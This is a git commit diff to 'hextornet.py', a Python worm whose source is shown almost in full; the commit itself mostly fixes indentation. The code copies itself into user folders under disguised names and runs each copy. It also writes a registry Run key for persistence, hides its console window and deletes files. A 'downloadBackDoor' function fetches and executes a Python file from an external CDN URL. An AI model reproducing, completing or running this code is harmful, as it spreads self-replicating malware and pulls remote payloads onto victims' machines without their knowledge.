b9dd9f3dd791d34f5e78707b9494ef1b1105ae00
Hector Torres <hectormtc@live.com>
2018-09-25 17:28:06 -0600

    Update hextornet.py

--- hextornet.py
+++ hextornet.py
@@ -22,7 +22,6 @@ print(
 )
 
 code = """
-
 #!/usr/bin/env python
 #import win32con, win32api, win32console, win32gui
 #from _winreg import *
@@ -32,20 +31,16 @@ import os, random, sys, pkg_resources
 from urllib2 import urlopen
 import subprocess as sp
 import shutil
-
-
 src = os.path.abspath(__file__)
 usr = getpass.getuser()
 hextornet = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
 directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
 hexDir = zip(directories, hextornet)
 dst = ""
-
 def hide():
-	window = win32console.GetConsoleWindow()
-	win32gui.ShowWindow(window,0)
-	return True
-
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window,0)
+        return True
 def addStartup():
     fp = os.path.dirname(os.path.realpath(__file__))
     file_name = sys.argv[0].split("'\\'")[-1]
@@ -53,40 +48,36 @@ def addStartup():
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
     key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
     SetValueEx(key2change, "Process", 0, REG_SZ, new_file_path)
-
 def downloadBackDoor(url):
-	print'\t[START DOWNLOAD]',src
-	filename = url.split('/')[-1].split('#')[0].split('?')[0]
-	content = urlopen(url).read()
+        print'\t[START DOWNLOAD]',src
+        filename = url.split('/')[-1].split('#')[0].split('?')[0]
+        content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
         outfile.close()
         #run(os.path.abspath(filename))
-	print'\t[DOWNLOAD DONE]', src
-
+        print'\t[DOWNLOAD DONE]', src
 def run(program):
-	print'\t[RUNNING WORM]',program
-	try:
-		process = subprocess.Popen('python ' + program, shell=True)
-		print'\t[PROCESS WORM]', process
-		process.wait()
-	except Exception as e:
-		return '[!]'+str(e)
-
+        print'\t[RUNNING WORM]',program
+        try:
+                process = subprocess.Popen('python ' + program, shell=True)
+                print'\t[PROCESS WORM]', process
+                process.wait()
+        except Exception as e:
+                return '[!]'+str(e)
 def main():
-	#hide()
-	#addStartup()
-	#hide()
-	run(src)
-	downloadBackDoor("https://cdn.fbsbx.com/v/t59.2708-21/24297685_1903721959657007_3729764176965402624_n.py/registro.py?_nc_cat=103&oh=94924732aeb080d40407392e177da87d&oe=5BAB8629&dl=1")
-
+        #hide()
+        #addStartup()
+        #hide()
+        run(src)
+        downloadBackDoor("https://cdn.fbsbx.com/v/t59.2708-21/24297685_1903721959657007_3729764176965402624_n.py/registro.py?_nc_cat=103&oh=94924732aeb080d40407392e177da87d&oe=5BAB8629&dl=1")
 if __name__ == "__main__":
-	main()
-
+        main()
 """
 
 
 src = os.path.abspath('hextornet.py')
+print src
 usr = getpass.getuser()
 
 hextornet   = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
@@ -96,9 +87,9 @@ hexDir = zip(directories, hextornet)
 dst = ""
 
 def hide():
-	window = win32console.GetConsoleWindow()
-	win32gui.ShowWindow(window,0)
-	return True
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window,0)
+        return True
 
 
 def addStartup():
@@ -113,10 +104,10 @@ def addStartup():
 
 
 def windows_client(system = sys.platform):
-    if system.startswith('win'):
-        return True
-    else:
-	return False
+        if system.startswith('win'):
+            return True
+        else:
+            return False
 
 
 def linux_client(system = sys.platform):
@@ -126,26 +117,26 @@ def linux_client(system = sys.platform):
         return False
 
 def copyHex(hexworm, src, dst):
-	copyfile(src, dst)
-	print'[PROPAGATE]', dst
-	hextornet.remove(hexworm)
+        copyfile(src, dst)
+        print'[PROPAGATE]', dst
+        hextornet.remove(hexworm)
 
 def duplicate(hexfile):
-	filename = open(str(hexfile),'w')
-	filename.write(code)
-	filename.close()
+        filename = open(str(hexfile),'w')
+        filename.write(code)
+        filename.close()
 
 def propagate():
-	print("==========Worm location==========")
-	for d, w in hexDir:
-		if linux_client():
-			dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
-		elif windows_client():
-			dst = "C:\Users" + usr + "/" + d + "/" + str(w) + ".py"
-		copyHex(w, src, dst)
-		duplicate(dst)
-		run(dst)
-	print("=================================")
+        print("==========Worm location==========")
+        for d, w in hexDir:
+                if linux_client():
+                        dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
+                elif windows_client():
+                        dst = "C:/Users" + "/" + usr + "/" + d + "/" + str(w) + '.py'
+                copyHex(w, src, dst)
+                duplicate(dst)
+                run(dst)
+        print("=================================")
 
 def hide():
         for fname in os.listdir('.'):
@@ -158,37 +149,37 @@ def hide():
                 else:
                         #to force deletion of a file set it to normal
                         win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
-			os.remove(fname)
+                        os.remove(fname)
 
 
 def downloadBackDoor(url):
-	print'===========1Start downloading=========='
-	filename = url.split('/')[-1].split('#')[0].split('?')[0]
-	print"...Reading file"
-	content = urlopen(url).read()
+        print'===========1Start downloading=========='
+        filename = url.split('/')[-1].split('#')[0].split('?')[0]
+        print"...Reading file"
+        content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
-	print'...Writing file'
+        print'...Writing file'
         outfile.close()
         run(os.path.abspath(filename))
-	print'==========1finish downloading=========='
+        print'==========1finish downloading=========='
 
 
 def run(program):
-	print'[RUN HEXTORNET]',program
-	try:
-		process = subprocess.Popen('python ' + program, shell=True)
-		process.wait()
-	except Exception as e:
-		return '[!]'+str(e)
-	
+        print'[RUN HEXTORNET]',program
+        try:
+                process = subprocess.Popen('python ' + program, shell=True)
+                process.wait()
+        except Exception as e:
+                return '[!]'+str(e)
+        
 def main():
-	#hide()
-	#addStartup()
-	propagate()
-	#hide()
-	#downloadBackDoor("https://cdn.fbsbx.com/v/t59.2708-21/24297685_1903721959657007_3729764176965402624_n.py/registro.py?_nc_cat=103&oh=94924732aeb080d40407392e177da87d&oe=5BAB8629&dl=1")
+        #hide()
+        #addStartup()
+        propagate()
+        #hide()
+        #downloadBackDoor("https://cdn.fbsbx.com/v/t59.2708-21/24297685_1903721959657007_3729764176965402624_n.py/registro.py?_nc_cat=103&oh=94924732aeb080d40407392e177da87d&oe=5BAB8629&dl=1")
 
 
 if __name__ == "__main__":
-	main()
+        main()
